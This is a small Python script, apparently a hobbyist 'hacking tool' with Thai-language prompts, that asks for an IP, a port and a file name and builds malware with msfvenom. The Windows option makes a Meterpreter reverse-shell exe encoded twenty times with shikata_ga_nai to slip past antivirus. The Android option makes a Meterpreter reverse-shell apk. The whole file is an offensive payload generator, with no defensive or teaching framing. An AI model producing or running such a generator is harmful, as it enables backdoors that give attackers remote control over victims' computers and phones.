# Create by pound
# Color a python
# import
import os, sys, time
# Color
green="\033[92m" 
yellow="\033[93m" 
red="\033[91m" 
blue="\033[96m"
white="\033[97m"
# Banner
def Banner():
    os.system("clear")
    os.system("figlet -f mono9 Create Payload | lolcat")
    print("\n[1] : Payload Windows\n")
    print("\n[2] : Payload Android")
# Hacking
def Create_Payload_Android():
    ip = input(white + "\n[" + red + "IP" + white + "]        " + blue + ": " + white + "")
    port = input(white + "\n[" + red + "Port" + white + "]        " + blue + ": " + white + "")
    print("\nอย่าลืมเขียน.apkนะครับ^_^")
    address = input(white + "\n[" + red + "Address Payload And Name payload.apk" + white + "]        " + blue + ": " + white + "")
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R> %s"%(ip, port, address))
    os.system("clear")
    print("\nCreate Payload Success\n")
    time.sleep(3)
    os.system("cat Hacking_Tools/banner_msfconsole.txt | lolcat")
    os.system("cd ~/Hacking_Tools")

def Create_Payload_Windows():
    ip = input(white + "\n[" + red + "IP" + white + "]        " + blue + ": " + white + "")
    port = input(white + "\n[" + red + "Port" + white + "]        " + blue + ": " + white + "")
    print("\nอย่าลืมเขียน.exeนะครับ^_^")
    address = input(white + "\n[" + red + "Address Payload And Name payload.exe" + white + "]        " + blue + ": " + white + "")
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -e x86/shikata_ga_nai -i 20 -f exe > %s"%(ip, port, address))
    os.system("clear")
    print("\nCreate Payload Success\n")                                     
    time.sleep(3)
    os.system("cat Hacking_Tools/banner_msfconsole.txt | lolcat")
    os.system("cd ~/Hacking_Tools")
# Run
Banner()
Nump = input(white + "\n[" + red + "Nump" + white + "]        " + blue + ": " + white + "")

if Nump == "1":
   Create_Payload_Windows()
elif Nump == "2":
   Create_Payload_Android()
else:
   print("\n Error \n")
   sys.exit()
